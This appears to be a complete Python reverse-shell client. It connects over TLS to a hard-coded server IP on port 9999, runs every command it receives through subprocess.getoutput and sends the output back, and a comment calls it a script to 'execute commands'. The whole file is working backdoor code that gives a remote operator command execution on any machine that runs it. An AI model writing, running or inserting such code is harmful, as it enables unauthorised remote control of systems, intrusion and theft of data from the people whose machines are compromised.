import socket
import ssl
import subprocess

certfile = "keys/server.crt"
ip = "64.227.73.246"  # عنوان السيرفر
port = 9999  # المنفذ الذي تود استخدامه

# Client script to connect to the server and execute commands
def connect():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(certfile)  # Load the server's certificate

    with socket.create_connection((ip, port)) as sock:
        with context.wrap_socket(sock, server_hostname=ip) as ssock:
            while True:
                cmd = ssock.recv(8192).decode()
                if cmd.lower() == "exit":
                    break
                output = subprocess.getoutput(cmd)
                ssock.sendall(output.encode())

connect()
